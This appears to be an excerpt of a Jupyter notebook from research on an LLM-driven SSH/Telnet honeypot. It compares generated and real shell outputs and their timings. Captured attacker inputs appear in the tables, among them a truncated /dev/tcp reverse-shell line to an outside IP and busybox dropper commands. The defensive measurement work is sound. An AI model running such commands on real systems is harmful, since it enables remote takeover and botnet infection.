ssh_df[ssh_df["cosine_adv"] == ssh_df["cosine_adv"].max()]

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
3866,echo R7 test,R7 test,0.655520,R7 test,0.001821,0,1.0,1.0,0.653699,1.0
3905,LANG=C;LANGUAGE=en;cat /var/www/owncloud/apps/...,cat: /var/www/owncloud/apps/graphapi/appinfo/i...,0.853353,cat: /var/www/owncloud/apps/graphapi/appinfo/i...,0.002111,0,1.0,1.0,0.851242,1.0


In [41]:
ssh_df[ssh_df["cosine_adv"] == ssh_df["cosine_adv"].min()]

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
6250,"nohup bash -c ""exec 6<>/dev/tcp/47.76.69.251/6...",user1@OHRA:~$ ls\nDocuments Downloads Music ...,0.789496,bash: connect: Network is unreachable\nbash: l...,0.001367,89,0.0,0.755287,0.788129,-0.063182


In [42]:
telnet_df[telnet_df["cosine_adv"] == telnet_df["cosine_adv"].max()]

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
400,/bin/busybox GTMEF,GTMEF: applet not found,0.795526,GTMEF: applet not found,0.001306,0,1.0,1.0,0.79422,1.000001


In [43]:
telnet_df[telnet_df["cosine_adv"] == telnet_df["cosine_adv"].min()]

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
19,chmod 777 .d || /bin/busybox chmod 777 .d || c...,,0.806578,chmod: cannot access '.d': No such file or dir...,0.014288,52,0.0,0.0,0.79229,-0.051563


In [44]:
ssh_df[ssh_df["timing_dif"] == ssh_df["timing_dif"].max()]

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
4040,uname -a & lscpu,Linux OHRA 5.15.0-58-generic #64-Ubuntu SMP Th...,7.372436,Linux debian 6.1.0-34-arm64 #1 SMP Debian 6.1....,0.003208,1179,0.152466,0.98907,7.369228,0.677276


In [45]:
telnet_df[telnet_df["timing_dif"] == telnet_df["timing_dif"].max()]

,input,gen_output,timing_data,real_output,real_timing,levenstein,jaccard,cosine_simple,timing_dif,cosine_adv
1332,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/b...,,20.00451,N/A,0.002656,3,0.0,0.0,20.001854,0.313125


## Check for revealing outputs

In [46]:
ssh_df.info()

<class 'pandas.core.frame.DataFrame'>
Index: 6875 entries, 0 to 6874
Data columns (total 10 columns):
 #   Column         Non-Null Count  Dtype  
---  ------         --------------  -----  
 0   input          6875 non-null   object 
 1   gen_output     6875 non-null   object 
 2   timing_data    6875 non-null   float64
 3   real_output    6875 non-null   object 
 4   real_timing    6875 non-null   float64
 5   levenstein     6875 non-null   int64  
 6   jaccard        6875 non-null   float64
 7   cosine_simple  6875 non-null   float64
 8   timing_dif     6875 non-null   float64
 9   cosine_adv     6875 non-null   float32
dtypes: float32(1), float64(5), int64(1), object(3)
memory usage: 822.0+ KB


In [47]:
pattern = r"(?:`|>|\$|\*|\?)"
ssh_df[(ssh_df["gen_output"].str.contains(pattern)) & (ssh_df["cosine_adv"] < 0.9)]["input"].count()

np.int64(85)

In [48]:
round(85 / 6875, 4) * 100

1.24

In [49]:
ssh_df[ssh_df["input"].str.contains(r"\bchpasswd\b|\bpasswd\b")]["input"].count()

np.int64(6640)

In [50]:
round(6640 / 6875, 4) * 100

96.58

In [51]:
telnet_df.info()

<class 'pandas.core.frame.DataFrame'>
Index: 4515 entries, 0 to 4514
Data columns (total 10 columns):
 #   Column         Non-Null Count  Dtype  
---  ------         --------------  -----  
 0   input          4515 non-null   object 
 1   gen_output     4515 non-null   object 
 2   timing_data    4515 non-null   float64
 3   real_output    4515 non-null   object 
 4   real_timing    4515 non-null   float64
 5   levenstein     4515 non-null   int64  
 6   jaccard        4515 non-null   float64
 7   cosine_simple  4515 non-null   float64
 8   timing_dif     4515 non-null   float64
 9   cosine_adv     4515 non-null   float32
dtypes: float32(1), float64(5), int64(1), object(3)
memory usage: 370.4+ KB


In [52]:
pattern = r"(?:`|>|\$|\*|\?)"
telnet_df[(telnet_df["gen_output"].str.contains(pattern)) & (~telnet_df["gen_output"].str.contains(r"\busage\b|\bhttp\b")) & (telnet_df["cosine_adv"] < 0.9)]["input"].count()

np.int64(102)

In [53]:
round(102 / 4514, 4) * 100

2.26